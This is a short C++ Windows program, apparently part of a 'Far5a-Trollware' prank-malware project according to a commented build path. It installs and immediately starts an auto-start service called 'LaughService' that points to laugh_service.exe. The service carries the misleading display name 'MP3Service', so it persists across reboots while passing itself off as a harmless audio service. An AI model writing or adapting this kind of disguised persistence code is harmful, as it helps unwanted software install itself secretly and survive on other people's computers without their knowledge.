#include <windows.h>
#include <iostream>
#include <filesystem>




int register_service_laugh_sound()
{
    char filepath[255];
    GetModuleFileNameA(NULL, filepath, 255);
    std::filesystem::path exepath(filepath);
    std::string service_path = exepath.parent_path().string() + std::string("\\laugh_service.exe");


    SC_HANDLE hSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
    if (hSCManager)
    {
        SC_HANDLE hService = CreateServiceA(
            hSCManager,
            "LaughService",            // Service name
            "MP3Service",  // Display name
            SERVICE_ALL_ACCESS,          // Access rights
            SERVICE_WIN32_OWN_PROCESS,   // Service type
            SERVICE_AUTO_START,          // Start type
            SERVICE_ERROR_NORMAL,        // Error control type
            service_path.c_str(), // Path to the service executable
            NULL, NULL, NULL, NULL, NULL);

        if (hService)
        {
            std::cout << "Service installed successfully!" << std::endl;
            CloseServiceHandle(hService);
        }
        else
        {
            std::cerr << "Failed to install service!" << std::endl;
        }

        CloseServiceHandle(hSCManager);
    }
    else
    {
        std::cerr << "Failed to open service manager!" << std::endl;
    }








    hSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_CONNECT);
    if (hSCManager)
    {
        SC_HANDLE hService = OpenServiceA(hSCManager, "LaughService", SERVICE_START);
        if (hService)
        {
            if (StartService(hService, 0, NULL))
            {
                std::cout << "Service started successfully!" << std::endl;
            }
            else
            {
                std::cerr << "Failed to start service!" << std::endl;
            }

            CloseServiceHandle(hService);
        }
        else
        {
            std::cerr << "Failed to open service!" << std::endl;
        }

        CloseServiceHandle(hSCManager);
    }
    else
    {
        std::cerr << "Failed to open service manager!" << std::endl;
    }

    //CreateServiceA(hndl, "LaughService", "EidFar5a", SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS, SERVICE_AUTO_START, SERVICE_ERROR_NORMAL, "D:\\CLASSSWORKKK\\far5a\\Far5a-Trollware\\bin\\laugh_service.exe", 0, 0, 0, 0, 0);
    //StartServiceA(hndl, 0, NULL);


    return 0;

}